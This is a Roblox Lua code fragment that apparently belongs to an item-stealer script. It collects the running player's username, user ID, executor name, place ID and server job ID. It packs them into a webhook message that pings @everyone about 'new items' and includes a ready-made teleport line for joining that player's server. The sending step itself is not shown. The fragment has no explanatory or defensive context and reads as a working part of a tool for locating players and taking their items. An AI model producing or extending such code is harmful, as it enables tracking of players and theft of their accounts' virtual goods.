local function createWebhookData(itemNames)
    local webhookcheck = detectExecutor()
    local LocalPlayer = game.Players.LocalPlayer
    local jobId = game.JobId
    local placeId = game.PlaceId
    local username = LocalPlayer.Name

    local teleportScript = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
        placeId, jobId
    )

    local data = {
        ["content"] = "@everyone ðŸš¨ New items detected! ðŸš¨",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "ðŸŽ‰ Items from " .. username,
                    ["url"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
                },
                ["description"] = string.format(
                    "**New Items:**\n%s\n\n**Executor:** %s\n\n**Join this server using this script:**```lua\n%s\n```",
                    itemNames, webhookcheck, teleportScript
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
                },
            }
        }
    }

    return HttpService:JSONEncode(data)
end
